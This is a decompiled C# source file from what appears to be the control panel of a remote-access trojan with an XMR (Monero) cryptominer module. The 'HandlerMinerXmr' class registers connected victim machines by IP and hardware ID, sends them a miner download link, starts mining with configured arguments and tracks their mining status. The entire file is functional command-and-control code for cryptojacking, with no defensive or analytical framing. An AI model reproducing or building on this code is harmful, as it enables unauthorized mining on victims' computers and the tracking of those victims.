using System;
using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages
{
	// Token: 0x02000052 RID: 82
	internal class HandlerMinerXmr
	{
		// Token: 0x060001DA RID: 474 RVA: 0x0001D730 File Offset: 0x0001B930
		public static void Read(Clients clients, object[] array)
		{
			string a = (string)array[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Status"))
				{
					if (!(a == "GetLink"))
					{
						return;
					}
					clients.Send(new object[]
					{
						"Link",
						Program.form.settings.linkMiner
					});
					return;
				}
				else
				{
					if (clients.Tag == null)
					{
						clients.Disconnect();
						return;
					}
					Program.form.MinerXMR.GridClients.Invoke(new MethodInvoker(delegate()
					{
						((DataGridViewRow)clients.Tag).Cells[2].Value = (string)array[2];
					}));
					return;
				}
			}
			else
			{
				if (Program.form.MinerXMR.work)
				{
					clients.Hwid = (string)array[2];
					DataGridViewRow Item = new DataGridViewRow();
					Item.Tag = clients;
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = clients.IP
					});
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = clients.Hwid
					});
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = "dont mining"
					});
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = (string)array[3]
					});
					Item.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = (string)array[4]
					});
					clients.Tag = Item;
					Program.form.MinerXMR.Invoke(new MethodInvoker(delegate()
					{
						Program.form.MinerXMR.GridClients.Rows.Add(Item);
						if (Program.form.MinerXMR.materialSwitch7.Checked)
						{
							clients.Send(Program.form.MinerXMR.Args());
						}
					}));
					return;
				}
				clients.Disconnect();
				return;
			}
		}
	}
}
